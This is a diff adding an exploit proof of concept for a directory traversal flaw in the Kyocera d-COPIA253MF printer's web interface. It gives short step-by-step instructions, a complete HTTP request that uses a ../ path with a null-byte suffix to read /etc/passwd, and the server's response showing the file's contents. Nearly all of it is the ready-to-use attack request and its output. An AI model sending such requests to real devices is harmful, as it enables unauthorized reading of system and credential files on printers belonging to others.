@@ -1,0 +1,68 @@
+# Exploit Title : Kyocera Printer d-COPIA253MF - Directory Traversal (PoC)
+# Exploit Author: Hakan Eren ŞAN
+# Date: 2020-06-06
+# Vendor Homepage: https://www.kyoceradocumentsolutions.com.tr/tr.html
+# Version: d-COPIA253MF plus
+# Tested on : Linux
+# Credit: Berat Isler
+
+
+# First step , you can capture the main page
+# Then create a directory traveral payload like ../../../ this
+# Then you add nullbyte to the end of the payload(%00)
+# Last step sent your request
+
+This is the code :
+
+Request:
+
+
+GET /wlmeng/../../../../../../../../../../../etc/passwd%00index.htm HTTP/1.1
+Host: X.X.X.X
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0)
+Gecko/20100101 Firefox/76.0
+Accept:
+text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: rtl=0
+Upgrade-Insecure-Requests: 1
+If-None-Match: "/wlmeng/index.htm, Thu, 04 Jun 2020 13:41:16 GMT"
+Cache-Control: max-age=0
+
+
+Response:
+
+HTTP/1.1 200 OK
+Content-Length: 843
+Date: Thu, 04 Jun 2020 16:09:54 GMT
+Server: KM-MFP-http/V0.0.1
+Last-Modified: Thu, 04 Jun 2020 13:41:16 GMT
+ETag: "/wlmeng/../../../../../../../../../../../etc/passwd, Thu, 04 Jun
+2020 13:41:16 GMT"
+Content-Type: text/html
+
+root::0:0:root:/root:/bin/sh
+bin:*:1:1:bin:/bin:/bin/sh
+daemon:*:2:2:daemon:/usr/sbin:/bin/sh
+sys:*:3:3:sys:/dev:/bin/sh
+adm:*:4:4:adm:/var/adm:/bin/sh
+lp:*:5:7:lp:/var/spool/lpd:/bin/sh
+sync:*:6:8:sync:/bin:/bin/sync
+shutdown:*:7:9:shutdown:/sbin:/sbin/shutdown
+halt:*:8:10:halt:/sbin:/sbin/halt
+mail:*:9:11:mail:/var/mail:/bin/sh
+news:*:10:12:news:/var/spool/news:/bin/sh
+uucp:*:11:13:uucp:/var/spool/uucp:/bin/sh
+operator:*:12:0:operator:/root:/bin/sh
+games:*:13:60:games:/usr/games:/bin/sh
+ftp:*:15:14:ftp:/var/ftp:/bin/sh
+man:*:16:20:man:/var/cache/man:/bin/sh
+www:*:17:18:www-data:/var/www:/bin/sh
+sshd:*:18:19:sshd:/var/run/sshd:/bin/sh
+proxy:*:19:21:proxy:/bin:/bin/sh
+telnetd:*:20:22:proxy:/bin:/bin/sh
+backup:*:34:34:backup:/var/backups:/bin/sh
+ais:*:101:101:ais:/var/run/ais:/bin/sh
+nobody:*:65534:65534:nobody:/nonexistent:/bin/sh
